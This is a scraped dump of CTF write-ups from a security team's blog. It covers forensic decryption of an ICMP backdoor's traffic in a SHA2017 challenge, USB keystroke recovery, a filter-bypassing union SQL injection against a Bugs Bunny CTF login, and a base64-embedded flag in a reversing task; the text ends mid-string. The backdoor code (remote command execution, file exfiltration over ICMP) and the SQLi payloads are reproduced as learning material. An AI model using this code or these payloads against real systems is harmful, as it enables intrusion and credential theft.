\"SHA2017\"key2=\"K8djhaIU8H2d1jNb\"stri=\"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ==\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()# cipher = AESCipher(sys.argv[1])# while True:# try: # pkts = sniff(filter=\"icmp\", timeout =5,count=1)# for packet in pkts:# if str(packet.getlayer(ICMP).type) == \"8\": # input = packet[IP].load# if input[0:len(magic)] == magic:# input = input.split(\":\")# data = cipher.decrypt(input[1]).split(\":\")# ip = packet[IP].src# if data[0] == \"command\":# output = run_command(data[1])# send_ping(ip, magic, \"command:&#123;&#125;\".format(output))# if data[0] == \"getfile\":# #print \"[+] Sending file &#123;&#125;\".format(data[1])# get_file(ip, magic, data[1])# except:# pass# break# print(final)#for i in range(0,301):# print(i, dicio[str(i)])# for k,v in dicio.iteritems(): # print(k, base64.urlsafe_b64decode(v))# print(base64.urlsafe_b64decode(final)) # if outp not in lis: # # print(outp) # print(numb) # lis.append(outp) # lis = sorted(lis) # for it in lis: # print(it)dicio = &#123;&#125;lis = []n = AESCipher(key2)infile1=\"encrypted1\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin),2): outp = n.decrypt(strin[i])infile2=\"encrypted2\"with open(infile2) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for lin in strin: outp = n.decrypt(lin) numb = re.findall(r\"getfile:([0-9]+).*\", outp) outp = re.findall(r\"getfile:[0-9]+:(.*)\", outp) if numb != []: if dicio.has_key(numb[0]): dicio[numb[0]].append(outp[0]) else: dicio[numb[0]]=[outp[0]]for j in range(0,4): final=\"\" for i in range(0,301): try: final += base64.urlsafe_b64decode(dicio[str(i)][j]) except IndexError: break file = open('lol%d.pcap'%j,'wb+') file.write(final) Now checking intranet.pcap we could see that we have more encrypted data but in this case was TLS, and then we remembered after we decrypted abuse2.cap we got our RSA.keys to decrypt these packages! so once again using wireshark to decrypt:Edit -&gt; Preferences -&gt; protocols -&gt; SSL 123kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol1.pcap intranet.pcapkinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark intranet.pcap Now seeing HTTP packages we can see that the hacker downloaded file secret.zip! The zip file is protected by a password! now we either bruteforce the zip file (which was a very hard way to do it since the password was “somehow” complicated) or we needed to find it in our USB capture! which is a USB keyboard capture! 123kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol4.pcap usb.pcapkinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark usb.pcap Extract the keys pressed from the usb.cap: 12kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r usb.pcap -Y \"frame.len==72\" -Tfields -e usb.capdata &gt; usb.txt And now getting the table to decode the keys from http://www.usb.org/developers/hidpage/Hut1_12v2.pdf Writting the script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778shift = \"02:00:00:00:00:00:00:00\"ignore = \"00:00:00:00:00:00:00:00\"ignore2 = \"01:00:00:00:00:00:00:00\"keys_dict = &#123;'04': 'a', '05': 'b', '06': 'c', '07': 'd', '08': 'e', '09': 'f', '0a': 'g', '0b': 'h', '0c': 'i', '0d': 'j', '0e': 'k', '0f': 'l', '10': 'm', '11': 'n', '12': 'o', '13': 'p', '14': 'q', '15': 'r', '16': 's', '17': 't', '18': 'u', '19': 'v', '1a': 'w', '1b': 'x', '1c': 'y', '1d': 'z', '1e': '1', '1f': '2', '20': '3', '21': '4', '22': '5', '23': '6', '24': '7', '25': '8', '26': '9', '27': '0', '28': '\\r\\n', '29': '', '2a': '', '2b': '', '2c': ' ', '2d': '-', '2e': '=', '2f': '[', '30': ']', '31': '\\\\', '32': '#', '33': ':', '34': \"'\", '35': '', '36': ',', '37': '.', '38': '/'&#125;with open('usb.txt', 'r') as f: keys_lines = f.readlines() s = \"\" for key in keys_lines: if key.strip() == shift or key.strip() == ignore or key.strip() == ignore2: continue k=key.split(\":\") #print key == ignore, key == '02:00:00:00:00:00:00:00', key if k[0] == '02': #shift pressed if keys_dict[k[2]] == '2': s += '@' else: s += keys_dict[k[2]].upper() else: s += keys_dict[k[2]] print s 1234567891011kinyabitch@Debian ~/D/H/c/sha2017&gt; python usb.pyrootWelcome123ls -lacurl -ks https://root:Welcome123@intranet/secret.zipunzip secret.zipPyj4m4P4rtY@2017cat secret.txtdisplay hamburglogoout The password is Pyj4m4P4rtY@2017 for the zip file! 1234567891011kinyabitch@Debian ~/D/H/c/sha2017&gt; unzip secret.zip Archive: secret.zip[secret.zip] secret.txt password: inflating: secret.txt inflating: hamburger_pussy.jpgkinyabitch@Debian ~/D/H/c/sha2017&gt; cat secret.txt Important passwords:secret.zip Pyj4m4P4rtY@2017root Welcome123flag flag&#123;bf107b7f64f320034df7e48669439f69&#125; Finally the flag was flag{bf107b7f64f320034df7e48669439f69}","categories":[{"name":"Network","slug":"Network","permalink":"https://teamrocketist.github.io/categories/Network/"}],"tags":[{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"usb","slug":"usb","permalink":"https://teamrocketist.github.io/tags/usb/"},{"name":"network","slug":"network","permalink":"https://teamrocketist.github.io/tags/network/"}]},{"title":"[Web] Bugs Bunny CTF - LQI_X 140","slug":"Web-Bugs-Bunny-CTF-LQI-X-140","date":"2017-08-02T10:29:58.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/","link":"","permalink":"https://teamrocketist.github.io/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/","excerpt":"","text":"LQI_X140Its for your , login and get all you needtask : http://34.253.165.46/LQI_X/Author: TnMch We have login form so lets start by doing some tests with curl at the GET parameter username: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -L \"http://34.253.165.46/LQI_X/?username=test'&amp;password=\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test'&amp;password= HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:27:30 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Vary: Accept-Encoding&lt; Content-Length: 749&lt; Content-Type: text/html; charset=UTF-8&lt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; &lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Nothing seems to be Changing lets try with password: 12345678910111213141516171819curl -L \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'%20or%201=1--\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'%20or%201=1-- HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:32:28 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Content-Length: 12&lt; Content-Type: text/html; charset=UTF-8&lt; * Curl_http_done: called premature == 0* Connection #0 to host 34.253.165.46 left intactNo way SOrry Wow a custom error message? they must be filtering some characters or even words… Maybe its the spaces, lets try to use the comment technique to bypass space filtering: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/or/**/1=1--\" -v* Trying 34.253.165.46...* TCP_NODELAY set* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'/**/or/**/1=1-- HTTP/1.1&gt; Host: 34.253.165.46&gt; User-Agent: curl/7.52.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Date: Wed, 02 Aug 2017 10:37:24 GMT&lt; Server: Apache/2.4.18 (Ubuntu)&lt; Vary: Accept-Encoding&lt; Content-Length: 753&lt; Content-Type: text/html; charset=UTF-8&lt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; test&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; It works! now lets use order by to see how many values are returned to know how many columns we will use on our union query injection. Using CURL with I option to check the status code from the request so if the query returns an error we will get a 500 (Internal Error) if not we get a 200 (OK) 12345678910111213(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/1--\"HTTP/1.1 200 OKDate: Wed, 02 Aug 2017 10:43:01 GMTServer: Apache/2.4.18 (Ubuntu)Content-Type: text/html; charset=UTF-8(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/2--\"HTTP/1.0 500 Internal Server ErrorDate: Wed, 02 Aug 2017 10:43:03 GMTServer: Apache/2.4.18 (Ubuntu)Connection: closeContent-Type: text/html; charset=UTF-8 As we can see the sql query is only selecting one column the real query must be something similar to this “Select username from table_users where username=%s and password=%s”. Now injecting with union: 123456789101112131415161718192021222324252627282930313233343536373839 curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/1--\"&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;SQLI-F - Log-in&lt;/title&gt; &lt;link rel='stylesheet' href='http://codepen.io/assets/libs/fullpage/jquery-ui.css'&gt; &lt;link rel=\"stylesheet\" href=\"css/style.css\" media=\"screen\" type=\"text/css\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"login-card\"&gt; &lt;h1&gt;Log-in&lt;/h1&gt;&lt;br&gt; &lt;form method=\"GET\" action=\"\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" name=\"login\" class=\"login login-submit\" value=\"login\"&gt; &lt;/form&gt; &lt;div class=\"login-help\"&gt; &lt;p&gt; 1&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; &lt;script src='http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; It worked! as you can see at the image above the number “1” showed up now what I tryed after this was getting the table names from information_schema but somehow I wasn’t able to do it so I tried to guess the obvious names, assumed that the table name is users and the columns probably id,username and password. 123456789101112131415161718192021222324252627282930313233343536373839404142curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/0,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 1&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 2&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1--\"* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 3&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;...curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1--\"&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1-- HTTP/1.1... &lt;div class=\"login-help\"&gt; &lt;p&gt; 5&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;... As we can see we were successful to leak the ids from the users now lets try with the password 12345678910111213141516171819202122232425262728293031(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/0,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; _Easy_I_Dont_Think&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/1,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; hello&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/2,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; here&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/3,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; test&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/4,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; &#125;&lt;/p&gt; &lt;/div&gt;.... With changing the limit we leaked all the passwords from the users as we can see the first user gave us an incomplete flag the others don’t seem to be part of the flag since there isn’t any “_” separating the words so lets assume our flag ends like “_Easy_I_Dont_Think}”.The rest of the flag must be in the username column! 123kinyabitch@Debian ~/D/H/ctf&gt; curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/username/**/from/**/users/**/limit/**/0,1--\"No way SOrry Fuck they are filtering the username too? wee need another technique to get the username field! Lets try to make the query always true! and then inject an union query: 1234567891011121314151617181920212223242526272829303132curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/0,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; Bugs_Bunny&#123;SQLi_Easy_!!&lt;/p&gt;&lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/1,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; a&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/2,1/**/--\"... &lt;div class=\"login-help\"&gt; &lt;p&gt; flag_is&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/3,1/**/--\"... &lt;div class=\"login-help\"&gt; &lt;p&gt; hello&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/4,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; so_2017!&lt;/p&gt;&lt;/div&gt;... The flag is the combination of the some of this strings after some trial and error trying to login I could see that the login table is: 12345678Usersid username password1 hello hello2 flag_is here 3 Bugs_Bunny&#123;SQLi_Easy_!! _Easy_I_Dont_Think4 so_2017! &#125; 5 test test So the flag is Bugs_Bunny{SQLi_Easy_!!_Easy_I_Dont_Thinkso_2017!}","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"filterbypass","slug":"filterbypass","permalink":"https://teamrocketist.github.io/tags/filterbypass/"}]},{"title":"[Reverse] BugsBunny CTF - Rev75","slug":"Reverse-BugsBunny-CTF-Rev75","date":"2017-08-01T08:03:50.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/08/01/Reverse-BugsBunny-CTF-Rev75/","link":"","permalink":"https://teamrocketist.github.io/2017/08/01/Reverse-BugsBunny-CTF-Rev75/","excerpt":"","text":"rev100100Find me faster !Author: Aymen Borgi At first by checking the main function we can observe that it leads us to nowhere either gives us the strings “bad password” or “good but no flag for you hihihi xD” if we gave the right password which could be found simply by debugging and break points. Now the flag must be in another functions there is alot starting from a0 to a814 By checking one of them we can see it contains a string that looks like they are encoded by base64 My plan was to copy all disassembled code from this functions and then use regex to get all the strings between quotes and concatenate them. After that I decoded the string and got a png image with the flag! here is the script: 12345strings = \"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